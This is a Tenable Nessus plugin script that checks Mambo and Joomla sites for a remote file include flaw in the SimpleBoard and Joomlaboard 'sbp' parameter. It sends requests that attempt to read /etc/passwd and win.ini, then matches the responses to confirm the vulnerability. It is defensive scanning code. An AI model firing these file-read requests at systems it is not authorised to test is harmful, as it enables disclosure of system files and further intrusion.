#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22023);
  script_version("$Revision: 1.29 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2006-3528", "CVE-2006-5043");
  script_bugtraq_id(18917, 23129);
  script_osvdb_id(27421, 27433, 28531);
  script_xref(name:"EDB-ID", value:"1994");
  script_xref(name:"EDB-ID", value:"3560");

  script_name(english:"SimpleBoard / Joomlaboard 'sbp' Parameter Remote File Include");
  script_summary(english:"Attempts to read a local file using SimpleBoard / Joomlaboard.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the SimpleBoard or Joomlaboard component for Mambo or
Joomla! running on the remote host is affected by a remote file
include vulnerability due to improper sanitization of user-supplied
input to the 'sbp' parameter before using it in the file_upload.php or
image_upload.php scripts to include PHP code. Provided the PHP
'register_globals' setting is enabled, an unauthenticated, remote
attacker can exploit this issue to disclose arbitrary files or execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"https://forum.joomla.org/viewtopic.php?t=76852");
  script_set_attribute(attribute:"solution", value:
"Disable the PHP 'register_globals' setting or upgrade to Joomlaboard
version 1.1.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/07/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/07/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/07/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:80,  php:TRUE);
app = "Mambo / Joomla!";

# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item("www/" +port+ "/mambo_mos");
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    dirs[ndirs++] = dir;
  }
}

if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

non_affect = make_list();
vuln = FALSE;

# Loop through each directory.
foreach dir (dirs)
{
  foreach file (files)
  {
    # Try to exploit the flaw to read a file.
    foreach com (make_list("com_simpleboard", "com_joomlaboard"))
    {
      url = dir + "/components/"+com+"/image_upload.php?sbp="+file;
      r = http_send_recv3(
        method : "GET",
        port   : port,
        item   : url,
        exit_on_fail : TRUE
      );
      res = r[2];

      # There's a problem if...
      if (
        egrep(pattern:file_pats[file], string:res) ||
        # we get an error saying "failed to open stream".
        egrep(pattern:"main\("+file+"\\0/sb_helpers\.php.+ failed to open stream", string:res) ||
        # we get an error claiming the file doesn't exist or...
        egrep(pattern:"main\("+file+"\).*: failed to open stream: No such file or directory", string:res) ||
        # we get an error about open_basedir restriction.
        egrep(pattern:"main.+ open_basedir restriction in effect. File", string:res)
      )
      {
        contents = res - strstr(res, "<br");
        vuln = TRUE;
        break;
      }
    }
    if (!thorough_tests) break;
  }
  non_affect = make_list(non_affect, dir);
  if (!thorough_tests) break;
}

if (!vuln)
{
  installs = max_index(non_affect);

  if (installs == 0)
    exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " are affected.");

  else if (installs == 1)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

  else exit(0, "None of the "+app+ " installs (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
}

# Report findings.
security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(build_url(qs:url, port:port)),
  output      : contents,
  attach_type : 'text/plain'
);
exit(0);
